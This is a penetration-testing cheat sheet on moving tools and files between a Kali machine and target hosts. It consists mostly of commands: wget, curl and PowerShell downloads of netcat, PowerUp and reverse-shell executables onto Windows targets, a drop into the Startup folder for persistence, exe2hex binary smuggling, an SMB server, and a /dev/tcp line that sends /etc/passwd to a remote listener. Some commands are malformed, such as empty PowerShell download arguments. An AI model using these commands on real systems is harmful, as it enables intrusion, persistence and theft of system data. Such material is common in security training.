# Tools & Files Transfer

In Kali, configure a Webserver

```jsx
python3 -m http.server 80
```

## **Download Files from Linux Machine**

***

Using Wget

```jsx
wget http://ip:80/file.txt
```

Using Curl

```jsx
curl http://ip:80/file.txt
```

## **Download Files from Windows Machine**

***

Using Wget

```jsx
wget <http://ip:80/nc.exe> -outfile nc.exe
```

Using PowerShell

```jsx
powershell "(New-Object System.Net.WebClient).DownloadFile('')"
```

Using PowerShell (with specified path)

```jsx
(New-Object System.Net.WebClient).DownloadFile("<http://10.10.10.10/PowerUp.ps1>", "C:\\\\Windows\\\\Temp\\\\PowerUp.ps1")
```

Using PowerShell (alternative syntax)

```jsx
powershell -c "(new-object System.Net.WebClient).DownloadFile('')"
```

Using PowerShell (with Invoke-WebRequest)

```jsx
powershell -c "Invoke-WebRequest -Uri '<http://192.168.119.212:8000/reverse.exe>' -OutFile 'C:\\\\xampp\\\\htdocs\\\\reverse.exe'"
```

Using PowerShell (copy to startup folder)

```jsx
Invoke-WebRequest "<http://10.10.10.10/binary.exe>" -OutFile "C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\binary.exe"
```

#### **Transfer Binaries to Windows with Exe2Hex:**

Locate the Binary in Kali

```jsx
locate nc.exe | grep binaries
```

Copy the Binary

```jsx
cp /usr/share/windows-resources/binaries/nc.exe .
```

Reduce File Size (Optional, using UPX)

```jsx
upx -9 nc.exe
```

Convert the Binary to a Windows Script

```jsx
exe2hex -x nc.exe -p nc.cmd head nc.cmd
```

Copy and Paste the Script to the Shell

Verify the Binary:

```jsx
nc -h
```

## **Transfer Files Over Network**

***

### **SSH**

Copy remote file to local

```jsx
scp user@192.168.1.1:passwords.txt /some/local/directory
```

Copy local file to remote host

```jsx
scp passwords.txt username@192.168.1.1:/some/remote/directory
```

### **/dev/tcp**

Send data to a remote machine (listener required on the specified port)

```jsx
cat /etc/passwd > /dev/tcp/192.168.1.1/8080
```

Receive the connection on Kali

```jsx
nc -nlvp 8080
```

### **SMB Server:**

Configure an SMB server in the same directory as the file

```jsx
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

Copy the file from the Windows machine

```jsx
copy $IP\\kali\\reverse.exe C:\\Users\\reverse.exe
```
